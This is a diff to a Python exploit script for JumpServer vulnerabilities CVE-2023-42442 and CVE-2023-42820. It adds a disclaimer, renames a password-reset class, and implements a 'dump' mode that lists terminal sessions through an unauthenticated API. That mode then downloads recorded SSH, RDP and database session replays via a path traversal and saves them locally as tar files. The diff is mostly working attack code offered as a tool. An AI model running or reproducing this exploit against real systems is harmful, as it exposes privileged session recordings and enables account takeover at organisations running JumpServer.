@@ -1,6 +1,22 @@
 # coding: utf-8
-# CVE-2023-42820 exploit
+"""
+Disclaimer: This tool is only intended for legally authorized enterprise security construction activities,
+such as internal attack and defense drills, vulnerability verification, and retesting. If you need to test the
+usability of this tool, please build your own target environment. When using this tool for testing, you should ensure
+that the behavior complies with local laws and regulations and has obtained sufficient authorization. Do not use
+against unauthorized targets. If you engage in any illegal behavior during the use of this tool, you shall bear the
+corresponding consequences on your own, and we will not assume any legal or joint liability
+
+CVE-2023-42442、CVE-2023-42820 exploit
+"""
+import datetime
+import gzip
+import io
+import json
+import os
 import sys
+import tarfile
+import tempfile
 import time
 import random
 import string
@@ -8,6 +24,7 @@ import asyncio
 import urllib3
 import logging
 import argparse
+from urllib.parse import urlparse
 
 # python3 -m pip install requests aiohttp beautifulsoup4
 import requests
@@ -264,10 +281,10 @@ def generate_password():
     return ''.join(passwd_list)
 
 
-class Context:
-    def __init__(self, baseurl: str, session, **kwargs):
+class ResetContext:
+    def __init__(self, baseurl: str, http_session, **kwargs):
         self.baseurl = baseurl
-        self.req = session
+        self.req = http_session
         self.req.headers.setdefault(
             "User-Agent",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
@@ -288,6 +305,123 @@ class Context:
             self.user_email = DEFAULT_EMAIL
 
 
+class DumpContext:
+    def __init__(self, baseurl, outpath):
+        self.baseurl = baseurl
+        self.outpath = outpath
+
+        gui_ext = ".replay.gz"
+        cli_ext = ".cast.gz"
+        # https://github.com/jumpserver/jumpserver/blob/v3.7.1/apps/assets/const/protocol.py#L13-L32
+        # Only ssh k8s rdp is confirmed, while others are not very certain
+        self.replay_type = {
+            "ssh": cli_ext,
+            "sftp": cli_ext,
+            "rdp": gui_ext,
+            "telnet": cli_ext,
+            "vnc": cli_ext,
+            "winrm": cli_ext,
+            "mysql": cli_ext,
+            "mariadb": cli_ext,
+            "oracle": cli_ext,
+            "postgresql": cli_ext,
+            "sqlserver": cli_ext,
+            "clickhouse": cli_ext,
+            "redis": cli_ext,
+            "mongodb": cli_ext,
+            "k8s": cli_ext,
+            "http": cli_ext,
+            "chatgpt": cli_ext,
+        }
+
+
+def make_output_path(ctx, relative):
+    out_dir = os.path.join(ctx.outpath, relative)
+
+    try:
+        os.makedirs(out_dir, mode=0o700, exist_ok=True)
+    except OSError as e:
+        out_dir = tempfile.mkdtemp()
+
+    return out_dir
+
+
+def get_gzip_bytes(data):
+    compressed_data = io.BytesIO()
+    with gzip.GzipFile(fileobj=compressed_data, mode="wb") as f:
+        f.write(data)
+    return compressed_data.getvalue()
+
+
+def dump_sessions(ctx):
+    parsed_baseurl = urlparse(ctx.baseurl)
+    base_outpath = make_output_path(ctx, parsed_baseurl.hostname)
+
+    replay_type_cnt = {}
+    success = False
+
+    sess_resp = requests.get(ctx.baseurl + "/api/v1/terminal/sessions/")
+    if sess_resp.status_code != 200:
+        logger.critical("[-] Exploit failed")
+    sess_json = sess_resp.json()
+    logger.info("[*] Found {} sessions".format(len(sess_json)))
+    for s in sess_json:
+        if not s["can_replay"]:
+            logger.debug("[-] Session [{}] doesn't have replay file, skip".format(s["id"]))
+            continue
+        try:
+            raw_time = datetime.datetime.strptime(s["date_start"], "%Y/%m/%d %H:%M:%S %z")
+            dash_time = raw_time.strftime("%Y-%m-%d")
+        except ValueError as err:
+            logging.error("[-] Resolving time failed: %s", err)
+            continue
+
+        replay_ext = ctx.replay_type.get(str(s["protocol"]).lower(), None)
+        if replay_ext is None:
+            logger.error("Unknown protocol [{}] in session [{}], please contact developer", s["protocol"], s["id"])
+            continue
+
+        replay_url = "{}/{}/{}{}".format("/media/xpack/../replay", dash_time, s["id"], replay_ext)
+        # Can't direct use requests.get(), see https://mazinahmed.net/blog/testing-for-path-traversal-with-python/
+        if ctx.baseurl.startswith("http"):
+            c_pool = urllib3.HTTPConnectionPool
+        else:
+            c_pool = urllib3.HTTPSConnectionPool
+        pool = c_pool(parsed_baseurl.hostname, parsed_baseurl.port)
+        resp = pool.urlopen("GET", replay_url)
+        if resp.status != 200:
+            logger.error("[-] [{}] {}".format(resp.status, replay_url))
+            continue
+
+        json_bytes = json.dumps(s).encode("utf-8")
+        gz_bytes = get_gzip_bytes(resp.data)
+
+        # note: The filename here must be id.tar, otherwise the jumpserver player cannot play it
+        out_path = "{}/{}.tar".format(base_outpath, s["id"])
+        with tarfile.open(out_path, mode='w') as tar:
+            gz_stream = io.BytesIO(gz_bytes)
+            gz_info = tarfile.TarInfo(name=s["id"] + replay_ext)
+            gz_info.size = len(gz_bytes)
+            tar.addfile(gz_info, gz_stream)
+            json_stream = io.BytesIO(json_bytes)
+            json_info = tarfile.TarInfo(name=s["id"] + ".json")
+            json_info.size = len(json_bytes)
+            tar.addfile(json_info, json_stream)
+
+        success = True
+        replay_type_cnt[s["protocol"]] = replay_type_cnt.get(s["protocol"], 0) + 1
+        logger.info("[+] {}".format(out_path))
+
+    if not success:
+        logger.warning("[-] Nothing found :(")
+        return
+
+    print("| Summary: ")
+    for t, tc in replay_type_cnt.items():
+        print("| {}: {}".format(t, tc), end='')
+    print()
+
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="")
     subparsers = parser.add_subparsers(title="", dest="subcommand", description="")
@@ -301,6 +435,7 @@ if __name__ == "__main__":
     reset_parser.add_argument("--email", type=str, default="", help="user's email you want to reset")
 
     dump_parser = subparsers.add_parser("dump", help="dump sessions")
+    dump_parser.add_argument("--outpath", type=str, default="output", help="session file output path")
 
     args = parser.parse_args()
 
@@ -321,12 +456,14 @@ if __name__ == "__main__":
     if not (base_url.startswith("http") or base_url.startswith("https://")):
         base_url = "http://" + base_url
 
+    logger.info("[*] Target url: {}".format(base_url))
+
     if args.subcommand == "reset":
         username = args.user
         user_email = args.email
 
         # Init
-        context = Context(base_url, requests.session(), username=username, user_email=user_email)
+        context = ResetContext(base_url, requests.session(), username=username, user_email=user_email)
         logger.info("[*] Reset password for user [{}] with email [{}]".format(context.username, context.user_email))
 
         key, init_captcha_url = get_captcha_url(context)
@@ -379,6 +516,7 @@ if __name__ == "__main__":
         else:
             logger.error("[-] Exploit failed")
     elif args.subcommand == "dump":
-        pass
+        context = DumpContext(base_url, args.outpath)
+        dump_sessions(context)
     else:
         parser.print_help()
